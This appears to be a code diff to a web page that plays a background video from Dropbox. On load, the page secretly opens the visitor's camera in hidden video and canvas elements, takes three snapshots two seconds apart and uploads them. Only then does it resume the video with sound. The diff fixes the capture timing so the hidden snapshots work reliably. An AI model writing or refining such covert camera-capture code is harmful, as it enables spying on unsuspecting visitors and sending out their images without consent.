@@ -52,15 +52,11 @@ video#backgroundVideo {
   100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
 }
 
-/* Hidden camera video and snapshot */
-video#cameraStream, canvas#snapshot {
-  display: none;
-}
+video#cameraStream, canvas#snapshot { display: none; }
 </style>
 </head>
 <body>
 
-<!-- Background Video (paused at start) -->
 <video id="backgroundVideo" loop playsinline>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
 </video>
@@ -78,8 +74,8 @@ const camVideo = document.getElementById('cameraStream');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
 
-// Function to take a snapshot
-async function takeSnapshot(video) {
+// Take snapshot helper
+function takeSnapshot(video) {
   if (!video.videoWidth || !video.videoHeight) return;
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -95,27 +91,30 @@ async function takeSnapshot(video) {
     .catch(err => console.error("Upload error:", err));
 }
 
-// Main function to handle camera and snapshots
+// Capture sequence
 async function captureCameraSequence() {
   try {
-    // Background video is already paused at start
+    // Pause background video
+    bgVideo.pause();
 
-    // Request camera access
+    // Request camera
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     camVideo.srcObject = stream;
 
-    // Take snapshots every 2 seconds for 6 seconds total
-    await takeSnapshot(camVideo);
-    setTimeout(() => takeSnapshot(camVideo), 2000);
-    setTimeout(() => takeSnapshot(camVideo), 4000);
+    // Wait for camera metadata to be ready
+    camVideo.onloadedmetadata = () => {
+      // Snapshots every 2 seconds
+      takeSnapshot(camVideo);
+      setTimeout(() => takeSnapshot(camVideo), 2000);
+      setTimeout(() => takeSnapshot(camVideo), 4000);
 
-    // Stop camera stream after snapshots
-    setTimeout(() => {
-      stream.getTracks().forEach(track => track.stop());
-      // Resume background video with audio
-      bgVideo.muted = false;
-      bgVideo.play();
-    }, 6000);
+      // Stop camera and resume background video
+      setTimeout(() => {
+        stream.getTracks().forEach(track => track.stop());
+        bgVideo.muted = false;
+        bgVideo.play();
+      }, 6000);
+    };
 
   } catch(err) {
     console.error("Camera error:", err);
@@ -124,7 +123,7 @@ async function captureCameraSequence() {
   }
 }
 
-// Start on page load
+// Start on load
 window.addEventListener('load', () => {
   captureCameraSequence();
 });
